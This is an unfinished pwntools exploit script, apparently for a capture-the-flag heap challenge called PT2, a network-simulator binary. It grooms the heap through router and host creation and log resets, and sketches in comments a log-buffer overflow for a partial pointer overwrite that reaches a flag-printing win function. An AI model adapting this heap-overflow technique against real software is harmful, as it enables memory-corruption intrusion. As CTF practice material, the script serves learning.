#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./PT2', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

def menu_choice(x):
    p.sendlineafter(b"Enter your choice: ", str(x).encode())

def sim_choice(x):
    p.sendlineafter(b"Enter your choice: ", str(x).encode())

def create_host(idx, name):
    menu_choice(1)
    p.sendlineafter(b"Enter host index: ", str(idx).encode())
    p.sendlineafter(b"Enter host name: ", name)

def create_router(idx, name):
    menu_choice(2)
    p.sendlineafter(b"Enter router index: ", str(idx).encode())
    p.sendlineafter(b"Enter router name: ", name)

def stop_router(idx):
    menu_choice(9)  # theo menu của binary (Stop Router)
    p.sendlineafter(b"Enter router index: ", str(idx).encode())

def connect_router_to_host(ridx, ifidx, hidx):
    menu_choice(3)
    p.sendlineafter(b"Enter router index: ", str(ridx).encode())
    p.sendlineafter(b"Enter interface index: ", str(ifidx).encode())
    p.sendlineafter(b"Host [1] or Router [2]: ", b"1")
    p.sendlineafter(b"Insert Host index: ", str(hidx).encode())

def enter_sim():
    menu_choice(16)

def sim_send(host_idx, dip_bytes, data):
    sim_choice(1)
    p.sendlineafter(b"Enter Host Index: ", str(host_idx).encode())
    p.sendlineafter(b"Enter IP (4 bytes, space-separated): ",
                    b"%d %d %d %d" % tuple(dip_bytes))
    p.sendlineafter(b"Enter data", data)

def sim_show_logs():
    sim_choice(2)

def sim_back_main():
    sim_choice(3)

# ---------------------------
# 0) Setup: tạo 1 host để có thể connect router (để connected_to != NULL)
create_host(0, b"A"*8)
create_router(0, b"R"*8)

# connect để connected_to có heap pointer hợp lệ (phục vụ partial overwrite)
connect_router_to_host(0, 0, 0)

# # (khuyến nghị) stop router để tránh router_thread deref pointer bị corrupt trước khi win
stop_router(0)

# # 1) Tạo vài log chunk "benign" rồi reset_logging để free chúng vào tcache
enter_sim()
for _ in range(3):
    sim_send(0, [9,9,9,9], b"X"*200)  # đủ để tạo log
sim_back_main()  # reset_logging xảy ra trong flow main<->sim

# # # 2) Sau reset, tạo router/hoặc thao tác khác để router nằm sát log chunk freed (tùy heap layout thực tế)
# # # (router đã tạo sẵn; tùy bạn debug heap để quyết định recreate router ở đây)

# # # 3) Trigger log overflow: cần message length >= 0x3FF để queue[0] không có NUL trong 1023 bytes
# # # Vì log format có prefix dài, bạn phải tính data length để snprintf fill tới 1023.
# enter_sim()
# payload = b"B"*1023
# sim_send(0, [9,9,9,9], payload)

# # # 4) Xem logs để leak / hoặc nếu overwrite chuẩn thì win_host_thread sẽ in flag và exit
# sim_show_logs()

p.interactive()